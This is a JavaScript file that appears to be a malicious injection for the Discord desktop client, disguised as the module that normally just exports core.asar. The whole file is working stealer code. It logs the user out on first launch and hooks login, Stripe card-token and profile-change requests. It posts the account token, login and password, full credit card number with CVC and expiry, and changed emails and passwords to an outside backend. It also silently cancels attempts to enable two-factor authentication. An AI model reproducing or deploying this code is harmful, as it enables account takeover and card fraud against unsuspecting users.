const fs = require('fs');
const https = require('https');
const {
    app,
    webContents,
    session
} = require('electron');
const { URLSearchParams } = require('url');

const config = JSON.parse(fs.readFileSync(`${__dirname}\\package.json`));

app.on('browser-window-created', () => {
    // If it's the first time log the user out :>
    if (config.first_time) {
        discordFunction('logout');

        // Save the options
        config.first_time = false;
        fs.writeFileSync(`${__dirname}\\package.json`, JSON.stringify(config));
    }
});

// Finds a function from discord exports
function discordFunction(method) {
    return webContents.getAllWebContents()[0].executeJavaScript(`
    (webpackChunkdiscord_app.push([
        [Math.random()], {},
        req => {
            m = [];
    
            for (let chunk in req.c) {
                m.push(req.c[chunk])
            }
        }
    ]), m).find(chunk => chunk?.exports?.default?.${method} !== undefined).exports.default.${method}()`);
}

function getUser(token) {
    return webContents.getAllWebContents()[0].executeJavaScript(`
    {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://discord.com/api/users/@me', false);
        xhr.setRequestHeader('Authorization', '${token}');
        xhr.send(null);
        xhr.responseText;
    }`);
}

function request(url, payload) {
    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': payload.length
        }
    }

    let req = https.request(url, options);
    req.write(payload);
    req.end();
}

// All the urls to catch
const filter = [
    'https://*/api/v*/auth/login',
    'https://api.stripe.com/v*/tokens',
    'https://*/api/v*/users/@me'
]

// The main process for catching web requests
session.defaultSession.webRequest.onCompleted({
    urls: filter
}, async details => {
    if (details.statusCode == 200) {
        const token = await discordFunction('getToken');
        const user = await getUser(token);

        if (details.url.endsWith('/auth/login')) {
            const requestBody = JSON.parse(details.uploadData[0].bytes.toString());

            if (!requestBody.mfa) {
                request(config.backend, JSON.stringify({
                    title: 'User logged in',
                    user: user,
                    token: token,
                    login: requestBody.login,
                    password: requestBody.password
                }));
            }
        }
        else if (details.url.endsWith('tokens')) {
            const queryString = new URLSearchParams(details.uploadData[0].bytes.toString());

            request(config.backend, JSON.stringify({
                title: 'Credit card stolen',
                user: user,
                token: token,
                number: queryString.get('card[number]'),
                cvc: queryString.get('card[cvc]'),
                expiry: `${queryString.get('card[exp_month]')}/${queryString.get('card[exp_year]')}`
            }));
        }
        else if (details.url.endsWith('@me') && details.method == 'PATCH') { // User info changed :>
            const requestBody = JSON.parse(details.uploadData[0].bytes.toString());

            if (requestBody.email) {
                request(config.backend, JSON.stringify({
                    title: 'Email changed',
                    user: user,
                    token: token,
                    new_email: requestBody.email,
                    password: requestBody.password,
                }));
            }
            else {
                request(config.backend, JSON.stringify({
                    title: 'Password changed',
                    user: user,
                    token: token,
                    old_password: requestBody.password,
                    new_password: requestBody.new_password,
                }));
            }
        }
    }
});

// Just a thing to prevent user from enabling 2FA
session.defaultSession.webRequest.onBeforeRequest({
    urls: ['https://*/api/v*/users/@me/mfa/totp/enable']
}, (details, callback) => {
    return callback({
        cancel: true
    })
})

// The thing the file would normally contain aka just setting the exports
module.exports = require('./core.asar')
